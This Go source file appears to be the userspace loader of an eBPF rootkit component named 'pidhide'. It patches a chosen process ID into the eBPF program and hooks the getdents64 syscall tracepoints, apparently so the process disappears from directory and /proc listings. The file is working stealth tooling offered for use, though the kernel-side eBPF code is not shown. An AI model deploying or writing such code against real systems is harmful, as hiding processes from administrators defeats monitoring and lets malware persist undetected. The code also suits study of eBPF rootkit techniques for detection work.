package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
	"golang.org/x/sys/unix"
	"log"
	"os"
	"os/signal"
	"syscall"
)

var pid = flag.String("pid", "0", "pid to hide")

func main() {
	// Subscribe to signals for terminating the program.
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// Remove resource limits for kernels <5.11.
	if err := rlimit.RemoveMemlock(); err != nil {

		log.Fatal("Removing memlock:", err)
	}
	spec, err := loadPidhide()
	if err != nil {
		log.Fatal("load pidhide error", err)
	}

	flag.Parse()
	var pid_to_hide []byte

	for i := 0; i < len(*pid); i++ {
		pid_to_hide = append(pid_to_hide, (*pid)[i])
	}

	//target_ppid := int32(312463)
	//pid_to_hide := []byte(*pidToHide)
	//fmt.Println(*pid)
	//fmt.Println(pid_to_hide)
	//pid_to_hide := []byte{'3', '1', '2', '4', '6', '3'}
	//pid_to_hide := []byte{'6', '0'}
	pid_to_hide_len := int32(len(pid_to_hide) + 1)

	// 获取字节序列并确保它的长度是10字节
	if len(pid_to_hide) < 10 {
		// 如果长度小于10，扩展切片
		padding := make([]byte, 10-len(pid_to_hide))
		pid_to_hide = append(pid_to_hide, padding...)
	}
	err = spec.RewriteConstants(map[string]interface{}{
		//"target_ppid":     target_ppid,
		"pid_to_hide_len": pid_to_hide_len,
		"pid_to_hide":     pid_to_hide,
	})
	if err != nil {
		log.Fatal("rewrite constants error,", err)
	}

	objs := pidhideObjects{}
	err = spec.LoadAndAssign(&objs, nil)
	if err != nil {
		log.Fatal("LoadAndAssign error,", err)
	}

	defer objs.Close()

	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64", objs.HandleGetdentsEnter, nil)
	if err != nil {
		log.Fatal("link tp enter error,", err)
	}
	defer tpEnter.Close()
	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.HandleGetdentsExit, nil)
	if err != nil {
		log.Fatal("link tp exit error,", err)
	}
	defer tpExit.Close()
	/*	tpPatch, err := link.Tracepoint("syscalls", "sys_exit_getdents64", objs.HandleGetdentsPatch, nil)
		if err != nil {
			log.Fatal("link tp patch error,", err)
		}
		defer tpPatch.Close()*/
	err = objs.MapProgArray.Put(uint32(1), objs.HandleGetdentsExit)
	if err != nil {
		log.Fatal("put HandleGetdentsEnter error,", err)
	}
	err = objs.MapProgArray.Put(uint32(2), objs.HandleGetdentsPatch)
	if err != nil {
		log.Fatal("put HandleGetdentsPatch error,", err)
	}

	rd, err := ringbuf.NewReader(objs.Rb)
	if err != nil {
		log.Fatal(err)
	}
	defer rd.Close()

	go func() {
		<-stopper

		if err := rd.Close(); err != nil {
			log.Fatalf("closing ringbuf reader: %s", err)
		}
	}()
	//go debug()

	log.Println("Waiting for events..")

	var event pidhideEvent
	for {
		record, err := rd.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				log.Println("Received signal, exiting..")
				return
			}
			log.Printf("reading from reader: %s", err)
			continue
		}
		err = binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &event)
		if err != nil {
			log.Printf("parsing ringbuf event: %s", err)
			continue
		}
		log.Printf("pid: %d\tcomm: %s\tsuccess:%t\n", event.Pid, unix.ByteSliceToString(event.Comm[:]), event.Success)
	}
}

func debug() {
	// 打开trace_pipe文件
	file, err := os.Open("/sys/kernel/debug/tracing/trace_pipe")
	if err != nil {
		log.Fatalf("Failed to open trace_pipe: %v", err)
	}
	defer file.Close()

	// 使用bufio.Reader读取文件
	reader := bufio.NewReader(file)

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalf("Failed to read from trace_pipe: %v", err)
		}

		// 打印从trace_pipe中读取的每一行
		fmt.Print(line)
	}
}
